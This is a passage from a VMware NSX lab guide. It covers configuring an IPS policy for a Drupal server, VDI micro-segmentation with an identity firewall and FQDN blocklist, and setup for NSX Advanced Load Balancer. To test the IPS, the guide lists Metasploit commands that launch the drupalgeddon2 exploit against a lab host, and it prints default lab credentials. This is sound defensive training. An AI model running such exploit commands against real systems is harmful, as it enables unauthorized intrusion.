<p><img src="https://media.screensteps.com/image_assets/assets/004/079/420/original/95e5ba55-e6c7-4528-ab37-1b80daf8c66e.png" alt="" /></p>
<p>Click <strong>SAVE</strong></p>
<h2 id="3-create-ips-policy-blocking-attacks-to-the-drupal-server"><a class="header" href="#3-create-ips-policy-blocking-attacks-to-the-drupal-server">3. Create IPS Policy blocking attacks to the Drupal Server</a></h2>
<p><img src="https://media.screensteps.com/image_assets/assets/003/968/892/original/ac3165b2-f716-481b-8fc9-e356acf05261.png" alt="" /></p>
<ol>
<li>Navigate to the <strong>RULES</strong> tab</li>
<li>Click on <strong>+ ADD POLICY</strong></li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/003/968/878/original/15185c46-5807-4a40-9934-3550257ab02d.png" alt="" /></p>
<p>Change the name to <strong>IPS</strong></p>
<p><img src="https://media.screensteps.com/image_assets/assets/003/968/870/medium/49a8e399-146a-41b7-91f9-1b6d0541e1a7.png" alt="" /></p>
<ol>
<li>Select the IPS policy</li>
<li>Click on <strong>+ ADD RULE</strong></li>
<li>Type <strong>IPS1</strong> in the Name field</li>
<li>Set the <strong>DEV</strong> group in the Destinations field</li>
<li>Select the <strong>IPS-DRUPAL</strong> for the IDS Profile</li>
<li>Set the <strong>DEV</strong> group in the Apply To field</li>
<li>Set the Mode to <strong>Detect &amp; Prevent</strong></li>
<li>Click <strong>Publish</strong></li>
</ol>
<h2 id="4-test-the-ips-rule"><a class="header" href="#4-test-the-ips-rule">4. Test the IPS rule</a></h2>
<p><img src="https://media.screensteps.com/image_assets/assets/003/968/876/original/15c3bcd7-361a-4496-9f45-5d9093bddcd0.png" alt="" /></p>
<p>SSH to the attacker VM. Credentials are vmware/VMware1!</p>
<p><img src="https://media.screensteps.com/image_assets/assets/003/968/888/original/25aaace4-5ec8-4607-82da-9c5eae60f461.png" alt="" /></p>
<p>Run the metasploit console by running the command <strong>sudo msfconsole</strong></p>
<p><img src="https://media.screensteps.com/image_assets/assets/004/125/867/original/4a8f026e-a8f5-4cd4-b005-298ca2fcdac0.png" alt="" /></p>
<p>Perform the drupalgeddon exploit again. For reference the commands are below. Copy and paste the one at the time.</p>
<p><code>use exploit/unix/webapp/drupal_drupalgeddon2</code></p>
<p><code>set RHOST 172.16.70.11</code></p>
<p><code>set RPORT 8080</code></p>
<p><code>exploit</code></p>
<p><img src="https://media.screensteps.com/image_assets/assets/004/206/842/original/d09fac92-425c-49c8-a3ba-000e14f3dfe9.png" alt="" /></p>
<ol>
<li>Navigate to the EVENTS tab</li>
<li>FIlter the events based on <strong>Product Affected</strong></li>
<li>Select the <strong>Drupal_Server</strong> product</li>
<li>Click <strong>APPLY</strong></li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/004/125/869/medium/da0721e9-ec73-406f-b039-c78e8acdbad6.png" alt="" /></p>
<ol>
<li>Expand the only event that should be visible</li>
<li>Note that the IPS has blocked some attacks (green portion of the bar). Click on the green portion of the bar.</li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/004/125/875/medium/09fb2ce1-9e0c-4c0c-a340-e6e6cc60b480.png" alt="" /></p>
<ol>
<li>Note the detail of the attacks that were blocked</li>
<li>Click <strong>Close</strong></li>
</ol>
<div id="chapter_begin" style="break-before: page; page-break-before: always;"></div><h1 id="24-protect-vdi-via-nsx-micro-segmentation-identity-firewall-l7-app-id-fqdn-based-firewall"><a class="header" href="#24-protect-vdi-via-nsx-micro-segmentation-identity-firewall-l7-app-id-fqdn-based-firewall">2.4 Protect VDI via NSX Micro-Segmentation (Identity Firewall, L7 APP-ID, FQDN based firewall)</a></h1>
<h2 id="1-overview-4"><a class="header" href="#1-overview-4">1. Overview</a></h2>
<p><img src="https://media.screensteps.com/image_assets/assets/004/048/872/medium/2f8d0b03-1ce2-4541-b141-45b95fdf65bb.png" alt="" /></p>
<p>In this section, we will explore NSX advanced micro-segmentation capabilities in the context of a VDI use case. The first task will be securing the communication between a virtual desktop and the domain controller (deployed outside of the NSX control). This communication involves a variety of protocols and TCP and UDP ports. The initial configuration we will deploy via terraform includes a mix of L4 and L7 rules. We will tune the design to leverage more L7 rules to have stricter control on the traffic to and from the domain controller.</p>
<p><img src="https://media.screensteps.com/image_assets/assets/004/048/870/medium/6298ac3f-6d26-45e5-aec1-a8f60802c687.png" alt="" /></p>
<p>The second section of this task will focus on Identity Firewall. NSX will allow access to specific URLs based on the identity of the user logged on the VDI. L7 rules will also control the TLS version the users are allowed to use.</p>
<h2 id="2-apply-vdi-micro-segmentation-policy-via-terraform"><a class="header" href="#2-apply-vdi-micro-segmentation-policy-via-terraform">2. Apply VDI Micro-segmentation Policy via Terraform</a></h2>
<p><img src="https://media.screensteps.com/image_assets/assets/003/997/664/original/868ceebd-d007-4625-97e0-07cdb741761f.png" alt="" /></p>
<p>SSH to <strong>ubuntu-utils</strong>. Credentials are livefire/VMware1!</p>
<p><img src="https://media.screensteps.com/image_assets/assets/004/206/950/original/bdf345e6-c92b-408d-b326-494485118be8.png" alt="" /></p>
<ol>
<li>Navigate to the terraform directory via the command <code>cd terraform</code></li>
<li>Copy the terraform file defining the VDI firewall policy from the repository directory to the terraform directory. Use the command: <code>cp ../vcnlivefire-v1/vdi_dfw.tf ./</code></li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/003/997/662/medium/c2e7eee4-f6f2-4cf1-a822-4df8ca3c5559.png" alt="" /></p>
<p>Run the command <code>terraform apply</code></p>
<p><img src="https://media.screensteps.com/image_assets/assets/003/997/668/original/c96be469-86b9-4dfc-8693-03fa02cc3f2e.png" alt="" /></p>
<p>Type <strong>yes</strong> then press Enter to confirm the changes</p>
<p><img src="https://media.screensteps.com/image_assets/assets/003/998/031/medium/28d0934f-b1b2-446f-a9d3-44092f7752bb.png" alt="" /></p>
<p>The policy will appear in the <strong>ENVIRONMENT</strong> section of the distributed firewall</p>
<p><img src="https://media.screensteps.com/image_assets/assets/003/998/053/original/66c226e7-3365-419f-b2b3-566ea0284273.png" alt="" /></p>
<p><img src="https://media.screensteps.com/image_assets/assets/003/998/017/original/de996190-8bac-4937-bf8e-e29d19b728ca.png" alt="" /></p>
<p>Clicking on the settings icon for each L7 rule (Layer 7 rules are those with a context profile applied), you can see the log label we associated to each of them to easily parse the logs generated by the matching traffic</p>
<h2 id="3-enable-identity-firewall-on-cluster-01a"><a class="header" href="#3-enable-identity-firewall-on-cluster-01a">3. Enable Identity Firewall on Cluster-01a</a></h2>
<p><img src="https://media.screensteps.com/image_assets/assets/003/998/027/medium/fd15e95a-b57f-4d99-9d22-23e7a4d000b6.png" alt="" /></p>
<p>You will see a banner saying &quot;<em>Identity Firewall is disabled. Rules containing groups with identity entities (e.g. AD groups), will not be enforced.</em>&quot; Click on <strong>Enable</strong>.</p>
<p><img src="https://media.screensteps.com/image_assets/assets/003/998/049/original/295ef389-60d5-48c7-a5d5-1aee063bd2d8.png" alt="" /></p>
<ol>
<li>Toggle the switch to enable <strong>Identify Firewall Status</strong> globally</li>
<li>Navigate to the Identity Firewall Settings tab</li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/003/998/029/original/3ebea8c9-559c-46fd-9ac2-c4327720ceab.png" alt="" /></p>
<ol>
<li>Enable Identity Firewall on <strong>Cluster-01a</strong></li>
<li>Click <strong>SAVE</strong></li>
</ol>
<p><strong>Note:</strong> It's worth going back and double checking the cluster configuration was saved. Sometimes this doesn't take effect.</p>
<h2 id="4-examine-active-directory-log-in-process"><a class="header" href="#4-examine-active-directory-log-in-process">4. Examine Active Directory Log In Process</a></h2>
<p><img src="https://media.screensteps.com/image_assets/assets/003/998/023/original/423e3f0c-5820-46f6-9e2b-9a07a5f6bc1e.png" alt="" /></p>
<p>SSH to esx-02a and run the command <code>tail -f /var/log/dfwpktlogs.log | grep 'l7\|l4'</code> . We are grepping for the log labels for the active directory traffic between the VDI and the domain controller. Rules <strong>6233-6237</strong> in the screenshot above (Rules number in your lab may be different)</p>
<p><img src="https://media.screensteps.com/image_assets/assets/004/132/690/medium/4bfc28d3-3ad0-4715-a6e6-c878d13cc9e1.png" alt="" /></p>
<p>From the vSphere client, launch the web console for <strong>win10-01a</strong></p>
<p><img src="https://media.screensteps.com/image_assets/assets/003/998/035/original/ed423cd4-7d23-4b24-80cf-acba113f310c.png" alt="" /></p>
<p>Click on <strong>Send Ctrl+Alt+Delete</strong> in the top right</p>
<p><img src="https://media.screensteps.com/image_assets/assets/003/998/039/original/a5020473-d06d-4592-a21d-a4230d638440.png" alt="" /></p>
<p>Sign in to the <strong>CORP</strong> domain with credentials <strong>olive/VMware1!</strong></p>
<p><img src="https://media.screensteps.com/image_assets/assets/003/998/025/medium/9c0fec90-cc1c-4412-affb-619328bca2fb.png" alt="" /></p>
<ol>
<li>In the logs you can see some traffic that is correctly categorized as DCE_RPC and LDAP protocols</li>
<li>Also some traffic that is inspected by the Active Directory L7 rules but it does not match the application and then match the fall back L4 rule. In this case the traffic on port 88 is Kerberos traffic.</li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/003/998/045/original/fc2f3398-75fa-4aa7-94f2-39873057b6ed.png" alt="" /></p>
<p>On the VDI VM console:</p>
<ol>
<li>Click on the <strong>Windows</strong> button</li>
<li><strong>Olive</strong></li>
<li><strong>Sign Out</strong></li>
</ol>
<h2 id="5-add-a-l7-kerberos-rule"><a class="header" href="#5-add-a-l7-kerberos-rule">5. Add a L7 Kerberos Rule</a></h2>
<p><img src="https://media.screensteps.com/image_assets/assets/003/998/021/medium/603a6ddf-85bf-4b3d-a847-f7ed9f49beb6.png" alt="" /></p>
<p>In the NSX Distributed Firewall UI:</p>
<ol>
<li>Select the <strong>LDAP rule</strong></li>
<li>Click <strong>CLONE</strong></li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/003/998/033/medium/71ab6781-8f90-492f-9c42-de0ef2ab311b.png" alt="" /></p>
<ol>
<li>Edit the name of the new policy to <strong>Allow Kerberos Traffic to/from domain controller L7</strong></li>
<li>Change the Services field to <strong>Kerberos</strong></li>
<li>Change the Context Profiles field to <strong>Kerberos</strong></li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/003/998/047/original/2fe850c1-3d74-41d4-97bd-58df8947f22e.png" alt="" /></p>
<p>Change the log labels to <strong>kerberos_l7</strong></p>
<p><img src="https://media.screensteps.com/image_assets/assets/003/998/015/original/4b70134c-30ee-4db2-a112-ad485094d2b5.png" alt="" /></p>
<p>Publish the changes</p>
<p><img src="https://media.screensteps.com/image_assets/assets/003/998/051/original/67431f71-3e88-4cfd-b5d6-52af5a7eb93d.png" alt="" /></p>
<p>Log in to the VDI again as Olive</p>
<p><img src="https://media.screensteps.com/image_assets/assets/003/998/043/medium/891d8c05-7b3a-478f-9364-85e044965680.png" alt="" /></p>
<ol>
<li>In the logs we can see that traffic on TCP port 88 is correctly categorized as <strong>APP_KERBEROS</strong></li>
<li>There is still some traffic (i.e. <strong>TCP port 445</strong>) that is matching the layer4 rule. Additional fine tuning of the L7 Segmentation policy could be achieved creating a layer 7 rule for that traffic</li>
</ol>
<h2 id="6-test-ssl-version-enforcement"><a class="header" href="#6-test-ssl-version-enforcement">6. Test SSL version enforcement</a></h2>
<p><img src="https://media.screensteps.com/image_assets/assets/004/206/959/original/dcb98d6d-9f5f-4824-bbdd-81ca27c450ed.png" alt="" /></p>
<p>On esx-02a grep the logs for the TLS pattern via the command: <code>tail -f /var/log/dfwpktlogs.log | grep 'TLS'</code></p>
<p><img src="https://media.screensteps.com/image_assets/assets/003/998/235/medium/4000150e-8984-439a-beb4-b765a66b0f9f.png" alt="" /></p>
<p>Navigate to <a href="https://tls-v1-2.badssl.com:1012/">https://tls-v1-2.badssl.com:1012/</a> and verify that it is accessible</p>
<p><img src="https://media.screensteps.com/image_assets/assets/003/998/233/medium/d83ae369-28a5-4c33-b935-294ff9afad0f.png" alt="" /></p>
<p>Navigate to <a href="https://tls-v1-2.badssl.com:1012/">https://tls-v1-0.badssl.com:1010/</a> and verify that it is <strong>NOT</strong> accessible</p>
<p><img src="https://media.screensteps.com/image_assets/assets/003/998/592/medium/b422e2e1-bb8b-4315-9fea-97fecdceeb34.png" alt="" /></p>
<p>Logs will show the allowed traffic (1) and the blocked traffic (2) based on the different SSL version in use.</p>
<h2 id="7-configure-fqdn-blocklist"><a class="header" href="#7-configure-fqdn-blocklist">7. Configure FQDN blocklist</a></h2>
<p><img src="https://media.screensteps.com/image_assets/assets/003/998/613/medium/42348b1f-1b80-4b20-b865-442b2d36afe9.png" alt="" /></p>
<ol>
<li>Navigate to the <strong>Inventory</strong> tab</li>
<li>Select <strong>Context Profiles</strong></li>
<li>Select the <strong>FQDNs</strong> tab</li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/003/998/616/original/eb3950a6-b263-4674-b55d-d09d4499156d.png" alt="" /></p>
<ol>
<li>Click on <strong>ACTIONS</strong></li>
<li>Select <strong>Add FQDN</strong></li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/003/998/607/original/c59b6fe8-e0ff-4fb1-b4de-445927f30ccf.png" alt="" /></p>
<ol>
<li>Type <strong>*.badssl.com</strong> in the domain field</li>
<li>Click <strong>SAVE</strong></li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/003/998/618/original/bde25288-db6c-4753-a689-2777270cf88b.png" alt="" /></p>
<ol>
<li>Select <strong>Context Profiles</strong></li>
<li>Click on <strong>ADD CONTEXT PROFILE</strong></li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/003/998/605/original/16019331-0b15-4410-929e-5be3c74d998b.png" alt="" /></p>
<ol>
<li>Type <strong>BADSSL</strong> in the Name field</li>
<li>Click on <strong>SET</strong> to edit the Attributes</li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/003/998/584/original/ea858c63-b412-431c-a40c-ad0dd85ce7a2.png" alt="" /></p>
<ol>
<li>Click on <strong>ADD ATTRIBUTE</strong></li>
<li>Select <strong>Domain(FQDN) Name</strong></li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/003/998/614/original/ace5295c-9052-42bc-b09e-04dd9b6a38e3.png" alt="" /></p>
<ol>
<li>Select the <strong>*.badssl.com</strong> domain you created</li>
<li>Click <strong>ADD</strong></li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/003/998/603/medium/1cb55d4d-ee44-410f-8aeb-b73bd7184dab.png" alt="" /></p>
<p>Click <strong>APPLY</strong></p>
<p><img src="https://media.screensteps.com/image_assets/assets/003/998/582/original/12da1ec6-4ed7-4879-9c26-76fe96988db2.png" alt="" /></p>
<p>Click <strong>SAVE</strong></p>
<p><img src="https://media.screensteps.com/image_assets/assets/003/998/593/medium/d0c7397f-3f56-4d90-9d6b-d106ff8740d5.png" alt="" /></p>
<ol>
<li>Navigate to the <strong>Security</strong> tab</li>
<li>Select <strong>Distributed Firewall</strong></li>
<li>Select the <strong>ENVIRONMENT</strong> category</li>
<li>Expand the <strong>vdi policy</strong></li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/003/998/577/medium/f0866fe4-043e-4615-b309-3df79dd81d42.png" alt="" /></p>
<p>Edit the Context Profiles field for the Identity Firewall Rules  </p>
<p><img src="https://media.screensteps.com/image_assets/assets/003/998/598/medium/3fd99a8c-ac99-43f7-84f4-695636fe33ac.png" alt="" /></p>
<ol>
<li>Type <strong>badssl</strong> in the search bar</li>
<li>Select the <strong>BADSSL</strong> profile you created</li>
<li>Click <strong>APPLY</strong></li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/003/998/600/medium/71b9ca86-aea1-4e50-a341-de314b93e5d9.png" alt="" /></p>
<p>Click <strong>PUBLISH</strong></p>
<h2 id="a-hrefvcnlivefireprotect-vdi-via-nsx-micro-segmentationhtmltest-identity-firewall-enforcement-in-conjunction-with-fqdn-blockinga8-test-identity-firewall-enforcement-in-conjunction-with-fqdn-blocking"><a class="header" href="#a-hrefvcnlivefireprotect-vdi-via-nsx-micro-segmentationhtmltest-identity-firewall-enforcement-in-conjunction-with-fqdn-blockinga8-test-identity-firewall-enforcement-in-conjunction-with-fqdn-blocking"><a href="vcn/livefire/protect-vdi-via-nsx-micro-segmentation.html#test-identity-firewall-enforcement-in-conjunction-with-fqdn-blocking"></a>8. Test Identity Firewall Enforcement in conjunction with FQDN Blocking</a></h2>
<p><img src="https://media.screensteps.com/image_assets/assets/003/998/589/original/a6733f00-1d0c-4fe6-bde5-bcc9db96bd34.png" alt="" /></p>
<p>Grep the logs based on the 'exec' label via the command:  <code>tail -f /var/log/dfwpktlogs.log | grep 'exec'</code></p>
<p>Logs matching the Identity based rule will have the exec label</p>
<p><img src="https://media.screensteps.com/image_assets/assets/003/998/610/original/b0d7f48f-dc42-4047-af3b-6f27d1db26d8.png" alt="" /></p>
<p>Log in to the VDI desktop as the user <strong>pat</strong> this time (password VMware1!). No need to sign off the user olive.</p>
<p><img src="https://media.screensteps.com/image_assets/assets/003/998/580/medium/204ee92e-9247-4db2-baf3-0863e00ebccc.png" alt="" /></p>
<p>Navigate to <a href="https://tls-v1-2.badssl.com:1012/">https://tls-v1-2.badssl.com:1012/</a> and verify that it is <strong>NOT</strong> accessible for the user pat (It was for the user olive)</p>
<p><img src="https://media.screensteps.com/image_assets/assets/003/998/595/medium/85e46111-ae87-476f-ae30-d944184833b7.png" alt="" /></p>
<p><img src="https://media.screensteps.com/image_assets/assets/003/998/586/original/21cc3155-2bb8-40be-a708-ec0b880fc8e4.png" alt="" /></p>
<p>Looking at the logs you can see the REJECT actions performed by the Identity Firewall rule</p>
<p>You can also see the matching based on the Active Directory Object Sid of the EXECS AD group the user pat is member of</p>
<div id="chapter_begin" style="break-before: page; page-break-before: always;"></div><h1 id="31-lab-introduction-and-overview"><a class="header" href="#31-lab-introduction-and-overview">3.1 Lab Introduction and Overview</a></h1>
<p>An audit with our customer has revealed that different groups use different tools for load balance purposes. Most of them are free tools for which no support is available. As the customer has already invested in VMware's Virtual Cloud Network portfolio we want to standardize the customers load balancing environment and migrate all existing solutions to NSX Advanced Load Balancer.</p>
<p>The first application we want to migrate is the customers WebApp. Currently we are using a dedicated VM running a nginx load balancer. The different tiers of the WebApp are connected to NSX overlay networks, thus we want to use the ALB's native NSX-T integration.</p>
<h2 id="lab-tasks"><a class="header" href="#lab-tasks">Lab Tasks</a></h2>
<ul>
<li>Prepare VMware vSphere and NSX-T for implementation with NSX ALB</li>
<li>Setup an NSX-T Cloud in ALB</li>
<li>Replace the existing LB with the ALB
<ul>
<li>Reuse existing IP</li>
<li>Import existing certificates</li>
</ul>
</li>
<li>Optional: Optimize the Virtual Service and discuss operational benefits</li>
</ul>
<h2 id="preparations"><a class="header" href="#preparations">Preparations</a></h2>
<p>The following items has been deployed and pre-configured:</p>
<ul>
<li>One NSX Advanced LB Controller VM has been deployed on vSphere</li>
<li>CA and Controller certificates have been installed</li>
<li>DNS and NTP servers are ser</li>
</ul>
<blockquote>
<p>If you are new to NSX Advanced Load Balancer (aka AVI Networks) we have a detailed description of the steps that have already been performed in section below.</p>
<p>For more information about the ALB's NSX integration please check out:<br />
<a href="https://avinetworks.com/docs/20.1/nsx-t-design-guide/">https://avinetworks.com/docs/20.1/nsx-t-design-guide/</a></p>
</blockquote>
<blockquote>
<p>You might find more &quot;Information only&quot; section in this guide.</p>
<p>As the name implies those are just used to highlight alternatives or provide additional information and do not have to be performed!</p>
</blockquote>
<h2 id="1-information-only-ca-and-controller-certificates"><a class="header" href="#1-information-only-ca-and-controller-certificates">1. Information Only: CA and Controller Certificates]</a></h2>
<p>The following steps demonstrate how to create and implement CA signed certificates in your ALB.</p>
<h3 id="11-certificate-authority"><a class="header" href="#11-certificate-authority">1.1. Certificate Authority</a></h3>
<p>First we want to import Certificate Authorities certificates.</p>
<p>For this navigate to the management page of our CA. We are using the Microsoft CA in our example.</p>
<p><img src="https://media.screensteps.com/image_assets/assets/004/135/323/medium/b74109d9-9f35-4091-88ec-5ac651743081.png" alt="" /></p>
<p>On the CA management screen click <strong>Download a CA certificate</strong></p>
<p><img src="https://media.screensteps.com/image_assets/assets/004/281/113/medium/68071615-e549-4424-8963-f29002cf4237.png" alt="" /></p>
<ol>
<li>Select <strong>Base 64</strong></li>
<li>and click **Download CA certificate<br />
**Store the file to a directory you have write access.</li>
</ol>
<p>Open the ALB management UI.</p>
<p><img src="https://media.screensteps.com/image_assets/assets/004/281/115/medium/7a26b43e-233b-48af-9e14-d918624ab495.png" alt="" /></p>
<ol>
<li>Click the menu item in the top left corner and select <strong>Templates</strong></li>
<li>Switch to the <strong>Security</strong> section</li>
<li>Select the <strong>SSL/TLS Certificates</strong> tab</li>
<li>Click <strong>CREATE</strong> on the right</li>
<li>and select <strong>Root/Intermediate CA Certificate</strong></li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/004/281/117/original/24667ce7-a201-4a44-a600-f93c5a31b58d.png" alt="" /></p>
<ol>
<li>Enter a <strong>Name</strong> for your CA certificate</li>
<li>Click <strong>Upload File</strong> and navigate to the the file you saved in the previous step.</li>
<li>Click <strong>Validate</strong></li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/004/135/331/original/e8be6a0a-26d6-4192-a0c1-a70fcd810546.png" alt="" /></p>
<p>You will see that the fields in the form will be filled with the information of your CA.</p>
<p>Click <strong>Import</strong></p>
<p><img src="https://media.screensteps.com/image_assets/assets/004/281/119/medium/8045fe3b-dc6d-4842-b84b-b5a09f00d533.png" alt="" /></p>
<p>Your CA certificate now showed up in the list of Root/Intermediate CA list.</p>
<h3 id="12-controller-certificate"><a class="header" href="#12-controller-certificate">1.2. Controller Certificate</a></h3>
<p>Next we want to create a certificate for our ALB controller.</p>
<p><img src="https://media.screensteps.com/image_assets/assets/004/281/121/medium/4c1b6417-2eba-4f02-adbe-866dd7e0a1f9.png" alt="" /></p>
<p>Still on the <strong>SSL/TLS Certificates</strong> screen.</p>
<ol>
<li>Click <strong>CREATE</strong></li>
<li>select <strong>Controller Certificate</strong></li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/004/135/337/original/2d30b776-94fd-4305-9b40-db6863bcfbcd.png" alt="" /></p>
<p>Enter a <strong>Name</strong> and click <strong>CSR</strong>.</p>
<p>This will open the following form:</p>
<p><img src="https://media.screensteps.com/image_assets/assets/004/281/123/original/5c5556be-cdad-4db4-9ee2-aed988943c55.png" alt="" /></p>
<p>Please fill out the form to your needs. As an example you can see how we created our certificate for our lab.</p>
<p>After all the information is entered. Click <strong>Save</strong></p>
<p><img src="https://media.screensteps.com/image_assets/assets/004/135/339/medium/3a9a0028-7f4f-4583-93ed-e81fb124a681.png" alt="" /></p>
<p>You can then see a new entry for our CSR.</p>
<p>Click the pencil icon on the right.</p>
<p><img src="https://media.screensteps.com/image_assets/assets/004/135/341/original/0641ed2c-a6ed-4dfb-8d22-1d73629fb9b9.png" alt="" /></p>
<p>Click <strong>Copy to clipboard</strong></p>
<p>Re-open the management interface of your CA.</p>
<p><img src="https://media.screensteps.com/image_assets/assets/004/135/343/medium/1cdcc838-2776-460c-9901-407321e15c6b.png" alt="" /></p>
<p>Click <strong>Request a certificate</strong></p>
<p><img src="https://media.screensteps.com/image_assets/assets/004/135/345/medium/e9dd2642-0ac4-4348-b2e1-de0f93d17fc2.png" alt="" /></p>
<p>Select <strong>advanced certificate request</strong></p>
<p><img src="https://media.screensteps.com/image_assets/assets/004/281/269/medium/f3f3c4bd-5a55-4069-9bc4-f9e2b262cc6c.png" alt="" /></p>
<ol>
<li>Paste the CSR into the Request field.</li>
<li>Select a valid template for your organization. In our case we have VMware Certificate Template</li>
<li>Press <strong>Submit</strong></li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/004/135/349/medium/cedb2d20-5304-40c3-8ce0-f02bf0ac85b9.png" alt="" /></p>
<ol>
<li>Make sure you select <strong>Base 64 encoded.</strong></li>
<li>Then click <strong>Download certificate</strong> and save it to a local directory.</li>
</ol>
<p>Switch back to the ALB management UI.</p>
<p><img src="https://media.screensteps.com/image_assets/assets/004/135/351/original/96cc1c3a-5f07-42aa-960c-faef1a575b82.png" alt="" /></p>
<p>The Edit Certificate dialogue should be still open.</p>
<ol>
<li>Click <strong>Upload File</strong> and point to the certificate file you have just downloaded.</li>
<li>Click <strong>Save</strong></li>
</ol>
<p>To activate the new certificate we have to change the Controller certificate:</p>
<p><img src="https://media.screensteps.com/image_assets/assets/004/281/271/medium/3230b9b1-cbf7-4082-894c-6f9986d64ec2.png" alt="" /></p>
<ol>
<li>Switch the configuration context to <strong>Administration</strong> using the menu button in the top left corner.</li>
<li>Click <strong>Settings</strong></li>
<li>Switch to the <strong>Access Settings</strong> tab</li>
<li>Click the pencil icon on the right</li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/004/281/273/medium/9d0f1416-1d1f-427c-ab38-4367214c1d5b.png" alt="" /></p>
<ol>
<li>Replace the existing <strong>SSL/TTL Certificate</strong> with the one you have just created.</li>
<li>Then click <strong>Save</strong></li>
</ol>
<p>Then logout from the management UI.</p>
<p><img src="https://media.screensteps.com/image_assets/assets/004/135/355/original/4d182537-6bbd-4c8b-b643-a948043cb221.png" alt="" /></p>
<p>Close the existing tab and open a new one.</p>
<p>If you point your browser now to the management UI you will see that the controller has a valid certificate.</p>
<h2 id="2-information-only-configure-dns-and-ntp-server"><a class="header" href="#2-information-only-configure-dns-and-ntp-server">2. Information Only: Configure DNS and NTP Server</a></h2>
<p>Next we want to point the ALB Controller to our existing DNS and NTP Server.</p>
<p><img src="https://media.screensteps.com/image_assets/assets/004/281/275/medium/fa8e2376-41d9-454c-84c8-821af3d7a024.png" alt="" /></p>
<ol>
<li>Select <strong>Administrator</strong> from the system menu in the top left corner.</li>
<li>Click <strong>Settings</strong></li>
<li>Switch to the <strong>DNS/NTP</strong> tab</li>
<li>and click the pencil icon.</li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/004/281/277/original/939f1393-345c-4a6f-9d77-67dfe4f35445.png" alt="" /></p>
<ol>
<li>Enter your DNS server</li>
<li>Enter the NTP servers you want connect to</li>
<li>Click <strong>Save</strong></li>
</ol>
<div id="chapter_begin" style="break-before: page; page-break-before: always;"></div><h1 id="32-nsx-t-cloud-preparations"><a class="header" href="#32-nsx-t-cloud-preparations">3.2 NSX-T Cloud Preparations</a></h1>
<blockquote>
<p>Before we can start with the configuration of the NSX-T Cloud, we have to prepare a few things:</p>
<ul>
<li>A Content Library in vSphere for the ALB to uploads the SE image</li>
<li>Identify the logical segment for SE management traffic</li>
<li>Optional but recommended: Configure ALB log forwarding</li>
<li>Prepare credentials for the ALB to connect to vSphere and NSX-T Manager</li>
</ul>
</blockquote>
<h2 id="1-content-library"><a class="header" href="#1-content-library">1. Content Library</a></h2>
<p>Please login to vCenter Server using the credentials administrator@vsphere.local and the password VMware1!</p>
<p><img src="https://media.screensteps.com/image_assets/assets/004/281/376/original/93b1c25b-f80f-4e76-9741-85452cdcb10c.png" alt="" /></p>
<ol>
<li>In vCenter Server click <strong>Menu</strong></li>
<li>click <strong>Content Libraries</strong></li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/004/135/574/original/cdb5c49f-566c-421c-917f-a94986b3edd4.png" alt="" /></p>
<p>Click <strong>Create</strong></p>
<p><img src="https://media.screensteps.com/image_assets/assets/004/428/075/original/c610ae2b-f6a8-47d9-861c-b303074c7602.png" alt="" /></p>
<p>Enter the <strong>Name</strong>: NSX Advanced Loadbalancer</p>
<p>Click <strong>NEXT</strong></p>
<p><img src="https://media.screensteps.com/image_assets/assets/004/281/380/original/85c10be4-ea57-4026-b41b-f247cc07b0da.png" alt="" /></p>
<ol>
<li>Make sure <strong>Local content library</strong> is selected<br />
<strong>Enable publishing</strong> is disabled</li>
<li>Click <strong>NEXT</strong></li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/004/281/382/original/dbdff452-0bcc-4b03-b82d-d5fa5874205a.png" alt="" /></p>
<ol>
<li>On the storage configuration screen select <strong>nfs-01</strong></li>
<li>Click <strong>NEXT</strong></li>
</ol>
<p><img src="https://media.screensteps.com/image_assets/assets/004/281/384/original/1b1e6247-791f-42d2-9155-3417b56e83a1.png" alt="" /></p>
<p>Review the settings and click <strong>FINISH</strong></p>
<p><img src="https://media.screensteps.com/image_assets/assets/004/281/386/medium/c41480bc-d713-4f10-8392-3250e7f6fb61.png" alt="" /></p>
<p>The new content library should appear in the list now.</p>
<h2 id="2-segment-for-se-management"><a class="header" href="#2-segment-for-se-management">2. Segment for SE Management</a></h2>
<p>Next we have to select a logical segment for SE management traffic.</p>
<p>Please login to NSX-T Manager using the credentials <strong>admin</strong> and the password <strong>VMware1!VMware1!</strong></p>
<p><img src="https://media.screensteps.com/image_assets/assets/004/428/077/medium/0285b22a-6105-4c34-a890-40d6f3826d32.png" alt="" /></p>
<ol>
<li>In NSX-T Manager click <strong>Networking</strong></li>
<li>Switch to <strong>Segments</strong></li>
<li>Make sure you are on the <strong>SEGMENTS</strong> tab</li>
<li>We will use the segment <strong>OV-LBMGMT</strong>
<ul>
<li>Please note the Subnet 172.16.100.1/24 and that we currently have 0 ports attached</li>
</ul>
</li>
</ol>
<h2 id="3-logging"><a class="header" href="#3-logging">3. Logging</a></h2>
<p>Our customer has implemented vRealize Log Insight for central log collection. We now have to configure log forwarding in ALB.</p>
<p>But first let's check if we have the AVI Networks Content Pack installed.</p>
<h3 id="31-log-insight-content-pack"><a class="header" href="#31-log-insight-content-pack">3.1. Log Insight Content Pack</a></h3>
<p>Please login to vRealize Log Insight using the credentials <strong>admin</strong> and the password <strong>VMware1!</strong></p>
